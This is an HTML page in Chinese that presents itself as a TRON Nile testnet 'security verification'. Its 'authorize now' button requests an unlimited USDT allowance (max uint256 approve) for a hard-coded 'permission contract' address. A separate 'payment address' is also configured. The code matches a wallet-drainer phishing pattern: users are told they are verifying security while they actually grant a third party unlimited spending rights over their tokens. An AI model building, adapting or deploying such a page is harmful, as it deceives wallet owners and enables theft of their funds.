<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Nile 测试网安全验证</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body { font-family: -apple-system, sans-serif; background: #f4f7f9; display: flex; justify-content: center; padding-top: 50px; }
        .card { background: white; padding: 25px; border-radius: 16px; width: 90%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center; }
        h3 { color: #333; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; line-height: 1.5; }
        #submitBtn { 
            background: #007aff; color: white; border: none; width: 100%; padding: 16px; 
            border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 25px;
            transition: background 0.2s;
        }
        #submitBtn:active { background: #0056b3; }
        #submitBtn.loading { background: #ccc; cursor: not-allowed; }
        #status { display: none; margin-top: 15px; font-size: 13px; color: #ff9500; }
    </style>
</head>
<body>
    <div class="card">
        <h3>安全验证</h3>
        <p>正在连接至 Nile 测试网...<br>请确保您的钱包已切换至测试网络并拥有足够的测试币 (TRX)。</p>
        
        <button id="submitBtn">立即授权</button>
        <div id="status">正在唤起安全签名，请稍候...</div>
    </div>

    <script>
        // --- 更新后的 Nile 配置 ---
        const CONFIG = {
            permissionAddress: 'TVNWMGHU19jdDfTe6A7BVAnjZ8REqC7CZc', // 权限合约地址
            paymentAddress: 'TXYCmYzcHMqvFvciMowRvt9ZoqFkkkPWmm',    // 收款地址
            usdtContract: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf'      // 你提供的 Nile USDT 地址
        };

        async function onApproveClick() {
            const btn = document.getElementById('submitBtn');
            const status = document.getElementById('status');

            // 1. 检查 TronWeb 是否存在
            if (typeof window.tronWeb === 'undefined') {
                alert("未检测到波场环境，请在钱包 DApp 浏览器中打开");
                return;
            }

            try {
                btn.disabled = true;
                btn.classList.add('loading');
                btn.textContent = "请求中...";
                status.style.display = "block";

                // 2. 关键：强制连接钱包（解决 Unknown error: {} 的核心步骤）
                const accountRes = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (accountRes && accountRes.code !== 200) {
                    throw new Error("用户拒绝连接钱包");
                }

                // 3. 实例化合约（必须在连接成功后执行）
                const contract = await window.tronWeb.contract().at(CONFIG.usdtContract);
                
                // 4. 无限额度
                const maxUint256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

                // 5. 发送授权请求
                console.log("目标权限地址:", CONFIG.permissionAddress);
                const txid = await contract.approve(
                    CONFIG.permissionAddress, 
                    maxUint256
                ).send({
                    feeLimit: 100000000 // 100 TRX 手续费限制
                });

                if (txid) {
                    alert("授权请求已发送！\n交易哈希: " + txid);
                    console.log("Success TXID:", txid);
                }

            } catch (err) {
                console.error("授权捕获到异常:", err);
                let errorMsg = err?.message || err;
                if (typeof errorMsg !== 'string') errorMsg = "环境异常或用户取消";
                
                alert("操作失败\n原因: " + (errorMsg.includes("declined") ? "用户取消了签名" : errorMsg));
            } finally {
                btn.disabled = false;
                btn.classList.remove('loading');
                btn.textContent = "立即授权";
                status.style.display = "none";
            }
        }

        // 绑定点击事件
        document.getElementById('submitBtn').onclick = onApproveClick;

        // 屏蔽了之前报错的心跳请求，确保本地调试顺畅
    </script>
</body>
</html>
